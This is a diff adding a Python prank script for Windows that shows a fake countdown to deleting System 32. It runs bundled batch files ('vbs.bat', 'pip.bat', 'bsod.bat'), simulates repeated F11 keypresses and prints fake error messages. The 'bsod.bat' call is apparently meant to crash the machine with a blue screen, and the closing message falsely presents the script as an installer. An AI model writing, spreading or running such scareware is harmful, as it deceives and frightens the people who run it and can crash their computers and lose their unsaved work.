@@ -1,0 +1,61 @@
+import subprocess
+import os
+from random import randint
+from time import sleep
+import sys
+from time import sleep
+from threading import Thread
+
+
+def musicThreading(arg):
+    batch_vbs_file_path = str(f"{os.path.dirname(__file__)}/vbs.bat")
+    subprocess.call([batch_vbs_file_path])
+
+musicThread = Thread(target = musicThreading, args = (10, ))
+musicThread.start()
+
+
+i = 15
+
+while i > 0:
+    print("Deleating system 32 in ", i)
+    sleep(0.9)
+    i = i - 1
+
+print("Goodbye :)")
+
+sleep(0.5)
+
+
+#bsod section \/
+if sys.platform == "win32":
+    os.chdir(os.path.dirname(__file__))
+
+    pip_file_path = str(f"{os.path.dirname(__file__)}/bat/pip.bat")
+    subprocess.call([pip_file_path])
+
+    try:
+        import keyboard  # pip install keyboard
+        range_repeat = randint(1, 3)
+        for i in range(range_repeat):
+            print("ERROR CANT FIND CURRENT WORKING DIRECTORY")
+            keyboard.press_and_release("F11")
+            keyboard.press_and_release("F11")
+            keyboard.press_and_release("F11")
+            keyboard.press_and_release("F11")
+            keyboard.press_and_release("F11")
+            sleep(0.01)
+            keyboard.press_and_release("F11")
+            keyboard.press_and_release("F11")
+            keyboard.press_and_release("F11")
+            keyboard.press_and_release("F11")
+
+
+        bat_file_path = str(f"{os.path.dirname(__file__)}/bat/bsod.bat")
+        subprocess.call([bat_file_path])
+
+    except:
+        input("Sorry something went wrong in the installation process. Please turn on internet and try again.")
+
+else:
+    input("Sorry, this program is only compatible with Windows.")
